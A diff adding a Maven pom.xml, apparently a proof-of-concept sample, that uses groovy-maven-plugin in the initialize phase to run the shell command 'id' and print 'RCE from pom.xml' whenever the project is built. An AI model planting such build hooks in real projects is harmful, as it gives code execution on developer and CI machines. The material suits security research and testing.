@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>mal.mvn.pwn</groupId>
+  <artifactId>mal_mvn</artifactId>
+  <version>0.13-SNAPSHOT</version>
+  <name>mal_mvn</name>
+  <url>http://localhost</url>
+  <properties>
+    <maven.compiler.source>1.8</maven.compiler.source>
+    <maven.compiler.target>1.8</maven.compiler.target>
+  </properties>
+  <dependencies>
+  </dependencies>
+  <build>
+    <plugins>
+        <plugin>
+          <groupId>org.codehaus.gmaven</groupId>
+          <artifactId>groovy-maven-plugin</artifactId>
+            <executions>
+              <execution>
+                <phase>initialize</phase>
+                <goals>
+                  <goal>execute</goal>
+                </goals>
+                <configuration>
+                  <source>
+                    print "RCE from pom.xml: "
+                    print "id".execute().text
+                  </source>
+                </configuration>
+              </execution>
+          </executions>
+        </plugin>
+     </plugins>   
+  </build>
+</project>
